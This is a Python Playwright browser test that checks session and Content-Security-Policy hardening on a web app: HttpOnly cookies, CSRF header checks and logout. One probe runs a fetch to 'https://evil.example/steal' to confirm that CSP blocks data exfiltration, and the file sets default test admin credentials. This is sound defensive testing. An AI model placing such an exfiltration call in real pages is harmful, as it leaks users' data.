"""Browser check for Phase 0 hardening, run against a live production-mode server.

Usage:
  BASE_URL=http://localhost:4100 ADMIN_EMAIL=... ADMIN_PASSWORD=... python3 e2e/session_e2e.py
Requires: pip install playwright && python -m playwright install chromium

Checks: login works, the session is an HttpOnly cookie (no token in localStorage),
no Content-Security-Policy violations on the main pages, cookie writes without the
client header are refused, logout clears the session, and a revoked session is refused.
"""
import os
import sys
from playwright.sync_api import sync_playwright, expect

BASE = os.environ.get("BASE_URL", "http://localhost:4100")
EMAIL = os.environ.get("ADMIN_EMAIL", "admin@e2e.school")
PASSWORD = os.environ.get("ADMIN_PASSWORD", "Admin-E2E-Pass-2026")
SHOTS = os.environ.get("SHOTS_DIR", "/tmp/e2e-shots")
os.makedirs(SHOTS, exist_ok=True)
failures = []


def check(name, fn):
    try:
        fn()
        print(f"PASS  {name}")
    except Exception as e:  # noqa: BLE001
        failures.append(name)
        print(f"FAIL  {name}\n      {str(e)[:500]}")


with sync_playwright() as p:
    browser = p.chromium.launch()
    context = browser.new_context()
    page = context.new_page()

    csp_violations = []
    probe_violations = []
    page.on("console", lambda m: csp_violations.append(m.text) if "Content Security Policy" in m.text else None)
    page.on("securitypolicyviolation", lambda e: csp_violations.append(e.violated_directive))

    def do_login():
        page.goto(f"{BASE}/login")
        page.fill("input[type=email]", EMAIL)
        page.fill("input[type=password]", PASSWORD)
        page.click("button[type=submit]")
        page.wait_for_url(lambda url: "/login" not in url, timeout=15000)
        page.wait_for_load_state("networkidle")

    check("login reaches the app", do_login)
    page.screenshot(path=f"{SHOTS}/after-login.png")

    def token_not_in_storage():
        stored = page.evaluate("() => Object.keys(localStorage)")
        assert "nitex_token" not in stored, f"token still stored: {stored}"
        assert "nitex_user" in stored, "user profile should still be cached"

    check("no token in localStorage (only the profile)", token_not_in_storage)

    def session_cookie_is_httponly():
        cookies = {c["name"]: c for c in context.cookies()}
        assert "nitex_session" in cookies, "session cookie missing"
        c = cookies["nitex_session"]
        assert c["httpOnly"] is True, "session cookie must be HttpOnly"
        assert c["sameSite"] == "Lax", f"SameSite should be Lax, got {c['sameSite']}"
        assert c["secure"] is True, "production cookie must be Secure"

    check("session cookie is HttpOnly, SameSite=Lax, Secure", session_cookie_is_httponly)

    def page_renders_data():
        page.goto(f"{BASE}/")
        page.wait_for_load_state("networkidle")
        assert "/login" not in page.url, f"redirected to login: {page.url}"

    check("dashboard loads with the cookie alone", page_renders_data)

    def write_needs_client_header():
        result = page.evaluate("""async () => {
          const body = JSON.stringify({ title: 'csrf probe', body: 'probe' });
          const bare = await fetch('/api/announcements', { method: 'POST',
            headers: { 'Content-Type': 'application/json' }, body });
          const tagged = await fetch('/api/announcements', { method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-NITEX-Client': 'web' }, body });
          return { bare: bare.status, tagged: tagged.status };
        }""")
        assert result["bare"] == 403, f"write without client header should be 403, got {result}"
        assert result["tagged"] in (200, 201), f"write with client header should succeed, got {result}"

    check("cookie write without client header is refused (403)", write_needs_client_header)

    def csp_blocks_foreign_connections():
        # Deliberate probe: the page tries to send data to another website.
        # The Content Security Policy must block it, and the browser reports the violation.
        before = len(csp_violations)
        result = page.evaluate("""async () => {
          try { await fetch('https://evil.example/steal', { mode: 'no-cors' }); return 'sent'; }
          catch (e) { return 'blocked'; }
        }""")
        page.wait_for_timeout(300)
        assert result == "blocked", f"foreign connection was not blocked: {result}"
        probe = csp_violations[before:]
        assert any("connect-src" in v for v in probe), f"no connect-src violation recorded: {probe}"
        probe_violations.extend(probe)

    check("CSP blocks the page from sending data to another website", csp_blocks_foreign_connections)

    def logout_clears_session():
        page.evaluate("async () => { await fetch('/api/auth/logout', { method: 'POST', headers: { 'X-NITEX-Client': 'web' } }); }")
        cookies = {c["name"]: c for c in context.cookies()}
        assert "nitex_session" not in cookies, "logout must clear the session cookie"

    check("logout clears the session cookie", logout_clears_session)

    def stale_session_refused():
        page.goto(f"{BASE}/")
        page.wait_for_load_state("networkidle")
        assert "/login" in page.url, f"after logout the app must send the user to login, got {page.url}"

    check("after logout the app returns to login", stale_session_refused)

    def csp_clean():
        # Everything except the deliberate probe above must be free of violations.
        real = [v for v in csp_violations if v not in probe_violations and "fonts.g" not in v and "evil.example" not in v]
        assert not real, f"CSP violations on normal pages: {real}"

    check("no Content-Security-Policy violations on the pages visited", csp_clean)

    page.screenshot(path=f"{SHOTS}/after-logout.png")
    browser.close()

if failures:
    print(f"\n{len(failures)} check(s) failed: {failures}")
    sys.exit(1)
print("\nall browser checks passed")
